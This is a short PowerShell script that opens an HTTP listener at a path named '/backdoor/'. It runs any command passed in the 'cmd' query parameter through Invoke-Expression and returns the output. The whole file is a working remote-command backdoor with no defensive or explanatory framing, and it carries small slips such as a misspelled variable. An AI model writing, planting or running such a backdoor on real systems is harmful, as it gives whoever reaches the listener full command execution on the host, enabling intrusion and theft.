$url = "http://localhost:8080/backdoor/"

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add($url)
$listener.Start()

while ($listener.IsListening) {
	
	$context = $listener.GetContext()
	$req = $context.Request
	$resp = $context.Response
	
	$cmd = $req.QueryString.Item("cmd")

	if ($cmd -eq $null) {
		
		$hmtl = ""

	} else {
	
		$html = iex($cmd) | Out-String
		$cmd = $null
	
	}

	if ($html -eq $null) {
	
		$html = ""

	}
		
	$buff = [System.Text.Encoding]::UTF8.GetBytes($html)
	$resp.OutputStream.Write($buff,0,$buff.length)

	$resp.close()

	$html = ""
	[System.Text.Encoding]::UTF8.GetBytes($html)


}

$listener.Stop()